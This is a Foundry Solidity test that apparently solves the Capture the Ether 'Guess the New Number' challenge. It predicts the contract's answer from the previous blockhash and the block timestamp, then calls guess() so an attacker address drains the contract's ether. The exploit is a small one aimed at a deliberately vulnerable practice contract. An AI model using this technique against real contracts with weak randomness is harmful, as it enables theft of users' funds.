// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import { GuessTheNewNumberChallenge } from "../../src/lotteries/GuessNewNum.sol";

contract GuessNewNumTest is Test {
    GuessTheNewNumberChallenge guessNewNum;

    address h3x0r = vm.addr(1337);

    function setUp() public {
        guessNewNum = new GuessTheNewNumberChallenge();
        deal(h3x0r, 1 ether);
        deal(address(guessNewNum), 1 ether);
    }

    function testNewNumExploit() public {
        vm.startPrank(h3x0r);
        // i have to fork this bc this is cheat
        uint8 key = uint8(uint(keccak256(
            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
        )));
        guessNewNum.guess{value: 1 ether}(key);
        assertEq(h3x0r.balance, 2 ether);
    }
}